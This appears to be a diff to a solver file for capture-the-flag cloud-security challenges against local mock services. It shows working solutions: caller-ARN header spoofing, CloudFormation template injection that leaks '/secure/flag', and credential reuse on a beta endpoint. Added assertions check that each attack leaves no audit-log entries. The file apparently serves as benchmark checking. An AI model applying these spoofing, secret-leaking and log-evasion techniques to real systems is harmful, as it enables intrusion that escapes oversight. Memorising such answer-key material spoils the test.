@@ -61,11 +61,14 @@ def cloud_22(base: str, flag: str) -> None:
 
 
 def cloud_25(base: str, flag: str) -> None:
+    wait_port(10725)
+    caller = http("GET", f"{base}/whoami").json()["caller_arn"]
     result = http("GET", f"{base}/search?q=flag").json()
     resource = next(item for item in result["results"] if item["id"] == "s-001")
     response = http("GET", f"{base}/resources/{resource['id']}", headers={
-        "X-Caller-ARN": "arn:aws:iam::111122223333:user/attacker"})
+        "X-Caller-ARN": caller})
     require_flag(response.body, flag)
+    assert http("GET", "http://127.0.0.1:10725/logs").json()["count"] == 0
 
 
 def cloud_27(base: str, flag: str) -> None:
@@ -95,6 +98,7 @@ def cloud_03(base: str, flag: str) -> None:
 
 
 def cloud_04(base: str, flag: str) -> None:
+    assert "/secure/" in http("GET", base).body
     template = "Resources:\n  Leak:\n    Properties:\n      Value: !Sub ${/secure/flag}\n"
     response = http("POST", f"{base}/parse", data=template.encode(), headers={"Content-Type": "text/plain"})
     assert response.status == 200
@@ -126,6 +130,11 @@ def cloud_15(base: str, flag: str) -> None:
 def cloud_23(base: str, flag: str) -> None:
     wait_port(10723)
     wait_port(10724)
+    # Normal exploration probes the advertised, audited endpoint first: it must
+    # not destroy the flag.
+    assert http("GET", f"{base}/api/supported").status == 200
+    covered = http("GET", "http://127.0.0.1:10724/logs?path=/api/supported").json()
+    assert covered["count"] >= 1
     leaked = "arn:aws:iam::111122223333:user/attacker/leaked-key"
     response = http("GET", f"{base}/api/unsupported", headers={"X-Caller-ARN": leaked})
     assert response.status == 403 and leaked in response.body
@@ -137,17 +146,33 @@ def cloud_23(base: str, flag: str) -> None:
         if "resource: arn:aws:iam::444455556666:role/" in hit.body:
             found.append(name)
     assert set(found) == {"AdminRole", "SecretRole", "DataPipelineRole"}
-    logs = http("GET", "http://127.0.0.1:10724/logs").json()
+    logs = http("GET", "http://127.0.0.1:10724/logs?path=/api/unsupported").json()
     assert logs["count"] == 0
     require_flag(logs.get("flag", ""), flag)
 
 
 def cloud_24(base: str, flag: str) -> None:
-    response = http("POST", f"{base}/portfolios", data=json.dumps({"name": "attacker", "include_flag": True}).encode(),
-                    headers={"Content-Type": "application/json", "X-Api-Key": "valid-sigv4"})
-    assert response.status == 200
-    pid = response.json()["portfolio_id"]
-    require_flag(http("GET", f"{base}/portfolios/{pid}", headers={"X-Api-Key": "valid-sigv4"}).body, flag)
+    wait_port(10727)
+    wait_port(10728)
+    wait_port(10729)
+    page = http("GET", "http://127.0.0.1:10727/").body
+    assert "aws242-servicecatalog-beta" in page
+    header = re.search(r'header:\s*"([^"]+)"', page).group(1)
+    credential = re.search(r'credential:\s*"([^"]+)"', page).group(1)
+    # The production baseline is audited.
+    prod = http("POST", "http://127.0.0.1:10729/portfolios",
+                data=json.dumps({"name": "baseline"}).encode(),
+                headers={"Content-Type": "application/json", header: credential})
+    assert prod.status == 200 and prod.json()["audited"] is True
+    counted = http("GET", "http://127.0.0.1:10728/logs").json()["count"]
+    assert counted >= 1
+    # The beta write is invisible and carries the flag.
+    created = http("POST", f"{base}/portfolios", data=json.dumps({"name": "attacker"}).encode(),
+                   headers={"Content-Type": "application/json", header: credential})
+    assert created.status == 200
+    pid = created.json()["portfolio_id"]
+    require_flag(http("GET", f"{base}/portfolios/{pid}", headers={header: credential}).body, flag)
+    assert http("GET", "http://127.0.0.1:10728/logs").json()["count"] == counted
 
 
 def cloud_29(base: str, flag: str) -> None:
